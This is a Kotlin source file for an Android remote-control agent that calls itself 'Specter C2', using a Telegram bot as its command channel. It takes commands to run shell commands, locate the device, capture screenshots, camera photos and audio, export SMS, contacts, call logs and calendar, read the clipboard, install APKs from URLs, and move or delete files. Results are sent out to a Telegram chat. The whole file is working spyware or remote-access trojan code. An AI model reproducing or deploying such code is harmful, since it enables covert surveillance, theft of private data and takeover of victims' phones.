package com.divine.specter.child.telegram

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.RequestBody.Companion.asRequestBody
import org.json.JSONObject
import org.json.JSONArray
import java.io.File
import java.io.IOException

class TelegramBotClient(
    private val context: Context,
    private val botToken: String,
    private val chatId: String
) {
    private val client = OkHttpClient()
    private val baseUrl = "https://api.telegram.org/bot$botToken"
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastUpdateId = 0L
    private var isPolling = false
    private lateinit var handlers: CommandHandlers

    companion object {
        private const val TAG = "TelegramBot"
    }

    init {
        handlers = CommandHandlers(context, this)
    }

    fun startPolling() {
        if (isPolling) return
        isPolling = true
        scope.launch {
            while (isPolling) {
                try {
                    pollUpdates()
                    delay(1000)
                } catch (e: Exception) {
                    Log.e(TAG, "Polling error", e)
                    delay(5000)
                }
            }
        }
    }

    fun stopPolling() {
        isPolling = false
    }

    private suspend fun pollUpdates() {
        val url = "$baseUrl/getUpdates?offset=$lastUpdateId&timeout=30"
        val request = Request.Builder().url(url).build()

        withContext(Dispatchers.IO) {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@use

                val json = JSONObject(response.body?.string() ?: return@use)
                if (!json.getBoolean("ok")) return@use

                val updates = json.getJSONArray("result")
                for (i in 0 until updates.length()) {
                    val update = updates.getJSONObject(i)
                    lastUpdateId = update.getLong("update_id") + 1

                    if (update.has("message")) {
                        val message = update.getJSONObject("message")
                        handleMessage(message)
                    }
                }
            }
        }
    }

    private suspend fun handleMessage(message: JSONObject) {
        if (!message.has("text")) return

        val text = message.getString("text")
        val messageChatId = message.getJSONObject("chat").getString("id")

        if (messageChatId != chatId && chatId != "0") return

        when {
            text.startsWith("/locate") -> handleLocate()
            text.startsWith("/status") -> handleStatus()
            text.startsWith("/screenshot") -> handleScreenshot()
            text.startsWith("/shell") -> handleShell(text.substringAfter("/shell").trim())
            text.startsWith("/get_calendar") -> handleGetCalendar()
            text.startsWith("/get_contacts") -> handleGetContacts()
            text.startsWith("/get_sms") -> handleGetSMS()
            text.startsWith("/get_calls") -> handleGetCalls()
            text.startsWith("/camera_front") -> handleCamera("front")
            text.startsWith("/camera_back") -> handleCamera("back")
            text.startsWith("/record_audio") -> handleRecordAudio()
            text.startsWith("/lock") -> handleLock()
            text.startsWith("/unlock") -> handleUnlock()
            text.startsWith("/reboot") -> handleReboot()
            text.startsWith("/vibrate") -> handleVibrate()
            text.startsWith("/toast") -> handleToast(text.substringAfter("/toast").trim())
            text.startsWith("/notification") -> handleNotification(text.substringAfter("/notification").trim())
            text.startsWith("/install") -> handleInstall(text.substringAfter("/install").trim())
            text.startsWith("/uninstall") -> handleUninstall(text.substringAfter("/uninstall").trim())
            text.startsWith("/list_apps") -> handleListApps()
            text.startsWith("/get_clipboard") -> handleGetClipboard()
            text.startsWith("/set_clipboard") -> handleSetClipboard(text.substringAfter("/set_clipboard").trim())
            text.startsWith("/wifi_scan") -> handleWifiScan()
            text.startsWith("/list_files") -> handleListFiles(text.substringAfter("/list_files").trim())
            text.startsWith("/download") -> handleDownload(text.substringAfter("/download").trim())
            text.startsWith("/upload") -> {
                val args = text.substringAfter("/upload").trim().split(" ", limit = 2)
                if (args.size == 2) {
                    handlers.handleUpload(args[0], args[1])
                } else {
                    sendMessage("❌ Usage: /upload <url> <destination_path>")
                }
            }
            text.startsWith("/delete") -> handleDelete(text.substringAfter("/delete").trim())
            text.startsWith("/help") -> handleHelp()
        }
    }

    private suspend fun handleLocate() = handlers.handleLocate()

    private suspend fun handleStatus() = handlers.handleStatus()

    private suspend fun handleScreenshot() = handlers.handleScreenshot()

    private suspend fun handleShell(command: String) = handlers.handleShell(command)

    private suspend fun handleGetCalendar() = handlers.handleGetCalendar()

    private suspend fun handleGetContacts() = handlers.handleGetContacts()

    private suspend fun handleGetSMS() = handlers.handleGetSMS()

    private suspend fun handleGetCalls() = handlers.handleGetCalls()

    private suspend fun handleCamera(direction: String) {
        if (direction == "front") {
            handlers.handleCameraFront()
        } else {
            handlers.handleCameraBack()
        }
    }

    private suspend fun handleRecordAudio() = handlers.handleRecordAudio()

    private suspend fun handleLock() = handlers.handleLock()

    private suspend fun handleUnlock() {
        sendMessage("🔓 Unlock not implemented (requires UI)")
    }

    private suspend fun handleReboot() = handlers.handleReboot()

    private suspend fun handleVibrate() = handlers.handleVibrate()

    private suspend fun handleToast(message: String) = handlers.handleToast(message)

    private suspend fun handleNotification(message: String) = handlers.handleNotification(message)

    private suspend fun handleInstall(url: String) = handlers.handleInstall(url)

    private suspend fun handleUninstall(packageName: String) = handlers.handleUninstall(packageName)

    private suspend fun handleListApps() = handlers.handleListApps()

    private suspend fun handleGetClipboard() = handlers.handleGetClipboard()

    private suspend fun handleSetClipboard(text: String) = handlers.handleSetClipboard(text)

    private suspend fun handleWifiScan() = handlers.handleWifiScan()

    private suspend fun handleListFiles(path: String) = handlers.handleListFiles(path)

    private suspend fun handleDownload(path: String) = handlers.handleDownload(path)

    private suspend fun handleDelete(path: String) = handlers.handleDelete(path)

    private suspend fun handleHelp() {
        val help = """
            📚 Specter C2 Commands:

            📍 /locate - Get GPS location
            📊 /status - Device status
            📸 /screenshot - Capture screen
            🖥️ /shell <cmd> - Execute command

            📅 /get_calendar - Export calendar
            📇 /get_contacts - Export contacts
            💬 /get_sms - Export messages
            📞 /get_calls - Export call log

            📷 /camera_front - Front camera photo
            📷 /camera_back - Back camera photo
            🎤 /record_audio - Record 60s audio

            🔒 /lock - Lock device
            🔓 /unlock - Unlock device
            🔄 /reboot - Reboot device

            📳 /vibrate - Vibrate
            💬 /toast <msg> - Show toast
            🔔 /notification <msg> - Show notification

            📦 /install <url> - Install APK
            🗑️ /uninstall <pkg> - Uninstall app
            📱 /list_apps - List installed apps

            📋 /get_clipboard - Get clipboard
            📋 /set_clipboard <text> - Set clipboard

            📡 /wifi_scan - Scan WiFi
            📁 /list_files [path] - List files
            ⬇️ /download <path> - Download file
            ⬆️ /upload - Upload file
            🗑️ /delete <path> - Delete file
        """.trimIndent()

        sendMessage(help)
    }

    suspend fun sendMessage(text: String) {
        try {
            val json = JSONObject()
            json.put("chat_id", chatId)
            json.put("text", text)
            json.put("parse_mode", "Markdown")

            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url("$baseUrl/sendMessage")
                .post(body)
                .build()

            withContext(Dispatchers.IO) {
                client.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.e(TAG, "Failed to send message: ${response.code}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Send message error", e)
        }
    }

    suspend fun sendPhoto(file: File, caption: String = "") {
        try {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", caption)
                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaType()))
                .build()

            val request = Request.Builder()
                .url("$baseUrl/sendPhoto")
                .post(requestBody)
                .build()

            withContext(Dispatchers.IO) {
                client.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.e(TAG, "Failed to send photo: ${response.code}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Send photo error", e)
        }
    }

    suspend fun sendDocument(file: File, caption: String = "") {
        try {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("caption", caption)
                .addFormDataPart("document", file.name, file.asRequestBody("application/octet-stream".toMediaType()))
                .build()

            val request = Request.Builder()
                .url("$baseUrl/sendDocument")
                .post(requestBody)
                .build()

            withContext(Dispatchers.IO) {
                client.newCall(request).execute().use { response ->
                    if (!response.isSuccessful) {
                        Log.e(TAG, "Failed to send document: ${response.code}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Send document error", e)
        }
    }
}
